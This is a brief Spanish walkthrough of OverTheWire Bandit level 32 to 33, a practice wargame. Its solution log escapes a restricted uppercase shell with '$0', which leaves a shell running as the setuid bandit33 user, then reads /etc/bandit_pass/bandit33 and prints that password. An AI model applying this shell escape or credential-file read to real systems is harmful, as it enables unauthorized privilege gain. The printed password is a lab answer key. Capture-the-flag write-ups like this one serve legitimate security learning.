# LEVEL 32 → LEVEL 33
# Objetivo
After all this `git` stuff its time for another escape. Good luck!
# Datos de acceso al nivel
```
ssh bandit32@bandit.labs.overthewire.org -p 2220
```
# Solución
```
WELCOME TO THE UPPERCASE SHELL  
sh: 1: 3: not found  
>> ·a  
sh: 1: ·A: not found  
>> !1  
sh: 1: !1: not found  
>> "1  
sh: 2: Syntax error: Unterminated quoted string  
>> ·1  
sh: 1: ·1: not found  
>> $1  
>> $4  
>> $5  
>> $6  
>> &6  
sh: 1: Syntax error: "&" unexpected  
>> $8  
>> $0  
ls  
uppershell  
file uppershell  
uppershell: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e6a8ed571599ce2bfa8b77145dbfc4eb933c1477, not stripped  
whoami  
bandit33  
cat /etc/bandit_pass/bandit33  
c9c3199ddf4121b10cf581a98d51caee
```
# Notas Adicionales

# Referencias